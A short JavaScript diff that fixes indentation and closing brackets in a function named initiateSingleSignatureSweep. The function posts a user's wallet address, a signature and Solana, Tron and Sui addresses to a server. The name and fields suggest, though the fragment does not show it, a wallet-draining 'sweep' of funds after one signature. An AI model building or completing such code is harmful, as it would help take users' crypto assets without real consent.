@@ -70,10 +70,12 @@ export async function initiateSingleSignatureSweep(provider, userAddress, solana
       body: JSON.stringify({
         address: userAddress,
         signature,
-      authMessage,
-      solanaAddress,
-      tronAddress,
-      suiAddress
+        authMessage,
+        solanaAddress,
+        tronAddress,
+        suiAddress
+      })
+    })
     const result = await response.json()
 
     if (result.success) {
